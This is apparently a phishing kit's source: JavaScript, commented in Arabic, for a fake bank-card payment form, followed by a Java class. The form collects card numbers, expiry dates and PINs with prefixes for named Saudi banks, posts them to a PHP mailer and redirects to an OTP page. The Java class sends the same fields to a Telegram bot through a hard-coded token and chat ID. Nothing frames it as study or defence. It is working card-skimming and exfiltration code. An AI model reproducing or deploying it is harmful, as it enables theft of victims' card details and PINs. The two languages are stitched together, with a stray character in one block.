document.getElementById("paymentForm").addEventListener("submit", function(event) {
    event.preventDefault(); // منع التحديث الافتراضي

    // جمع البيانات
    let formData = {
        bank: document.getElementById("bankSelect").value,
        prefix: document.getElementById("prefixSelect").value,
        cardNumber: document.getElementById("cardNumber").value,
        expiryMonth: document.getElementById("monthSelect").value,
        expiryYear: document.getElementById("yearSelect").value,
        pin: document.getElementById("pin").value
    };

    // تخزين البيانات في localStorage
    localStorage.setItem("paymentData", JSON.stringify(formData));

    // إرسال البيانات إلى PHP
    fetch("send_email.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData)
    })
    .then(response => response.text())
    .then(data => {
        alert(data); // عرض رسالة نجاح أو فشل
    })
    .catch(error => {
        console.error("Error:", error);
        alert("حدث خطأ أثناء الإرسال!");
    });
});

// دالة إعادة تعيين النموذج
function resetForm() {
    document.getElementById("paymentForm").reset();
    localStorage.removeItem("paymentData"); // حذف البيانات من التخزين
}

// تعريف الدالة التي ستقوم بتحديث الأرقام بناءً على اختيار البنك
document.getElementById('bankSelect').addEventListener('change', function() {
    var bankSelect = document.getElementById('bankSelect');
    var prefixSelect = document.getElementById('prefixSelect');
    var cardNumberField = document.getElementById('cardNumber');

    // إعادة تعيين الحقول
    prefixSelect.innerHTML = '<option value="" disabled selected>Prefix</option>';
    cardNumberField.value = ''; // مسح الحقل

    // حسب البنك المختار، قم بإضافة الأرقام المناسبة
    if (bankSelect.value === 'bank1') {
        // عند اختيار البنك الأهلي المتحد
        prefixSelect.innerHTML += `
            <option value="">403622</option>
            <option value="">423826</option>
            <option value="">428628</option>
        `;
    } else if (bankSelect.value === 'bank2') {
        // عند اختيار بنك الراجحي
        prefixSelect.innerHTML += `
            <option value="">458838</option>
        `;
    } else if (bankSelect.value === 'bank3') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">588790</option>
            <option value="">418056</option>
        `;
    }
    else if (bankSelect.value === 'bank4') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">470350</option>
            <option value="">490455</option>
            <option value="">490456</option>
            <option value="">404919</option>
            <option value="">450605</option>
            <option value="">426058</option>
            <option value="">431199</option>

        `;
    }
    else if (bankSelect.value === 'bank5') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">49219000</option>
            <option value="">415254</option>
            <option value="">450238</option>
            <option value="">468564</option>
            <option value="">540759</option>
            <option value="">402978</option>
            <option value="">403583</option>

        `;
    }
    else if (bankSelect.value === 'bank6') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">532672</option>
            <option value="">537015</option>
            <option value="">521175</option>
            <option value="">516334</option>

        `;
    }
    else if (bankSelect.value === 'bank7') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">419252</option>

        `;
    }


    else if (bankSelect.value === 'bank8') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">531644</option>
            <option value="">517419</option>
            <option value="">531471</option>
            <option value="">559475</option>
            <option value="">517458</option>
            <option value="">526206</option>
            <option value="">531329</option>
            <option value="">531470</option>

        `;
    }
    else if (bankSelect.value === 'bank9') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">45077848</option>
            <option value="">45077849</option>

        `;
    }

    else if (bankSelect.value === 'bank10') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">450778</option>
            <option value="">537016</option>
            <option value="">532674</option>
            <option value="">485602</option>

        `;
    }

    else if (bankSelect.value === 'bank11') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">406464</option>
            <option value="">409054</option>

        `;
    }

    else if (bankSelect.value === 'bank12') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">464452</option>
            <option value="">589160</option>

        `;
    } 

    else if (bankSelect.value === 'bank13') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">464425250</option>
            <option value="">543363</option>

        `;
    }

    else if (bankSelect.value === 'bank14') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">524745</option>
            <option value="">521020</option>

        `;
    }

    else if (bankSelect.value === 'bank15') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">457778</option>
د
        `;
    }

    else if (bankSelect.value === 'bank16') {
        // عند اختيار البنك الوطني
        prefixSelect.innerHTML += `
            <option value="">532749</option>
            <option value="">559459</option>
            <option value="">541350</option>
            <option value="">525528</option>

        `;
    }
});


// إضافة حدث عند تغيير البادئة لتحديث رقم البطاقة
document.getElementById('prefixSelect').addEventListener('change', function() {
    var selectedPrefix = document.getElementById('prefixSelect').value;
    var cardNumberField = document.getElementById('cardNumber');
    
    if (selectedPrefix) {
        cardNumberField.value = selectedPrefix; // تحديث رقم البطاقة بناءً على البادئة
    }
});
document.getElementById('submitButton').onclick = function() {
    window.location.href = "otp.html"; // التوجيه إلى صفحة جديدة
}


import org.apache.http.HttpEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpHeaders;
import java.util.Map;
import java.util.HashMap;

public class TelegramBot {
    private static final String TOKEN = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E";
    private static final String CHAT_ID = "6454807559";

    public static void main(String[] args) {
        // بيانات النموذج
        String bank = "البنك الأهلي المتحد";
        String prefix = "403622";
        String cardNumber = "1234567890";
        String expiryMonth = "12";
        String expiryYear = "25";
        String pin = "1234";

        // بناء رسالة التنسيق
        String message = String.format(
            "<b>تفاصيل عملية الدفع:</b>\n" +
            "<b>البنك المختار:</b> %s\n" +
            "<b>البادئة:</b> %s\n" +
            "<b>رقم البطاقة:</b> %s\n" +
            "<b>تاريخ الانتهاء:</b> %s/%s\n" +
            "<b>الرقم السري:</b> %s",
            bank, prefix, cardNumber, expiryMonth, expiryYear, pin
        );

        // إرسال الرسالة إلى تليجرام
        sendTelegramMessage(message);
    }

    private static void sendTelegramMessage(String message) {
        try {
            // بناء URL لواجهة تليجرام
            String url = String.format(
                "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&parse_mode=html&text=%s",
                TOKEN, CHAT_ID, message
            );

            // إنشاء عميل HTTP
            HttpClient client = HttpClient.newHttpClient();

            // بناء طلب HTTP GET
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .build();

            // إرسال الطلب والحصول على الاستجابة
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

            // التحقق من حالة الاستجابة
            if (response.statusCode() == 200) {
                System.out.println("تم إرسال الرسالة بنجاح!");
            } else {
                System.out.println("فشل في إرسال الرسالة. رمز الحالة: " + response.statusCode());
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
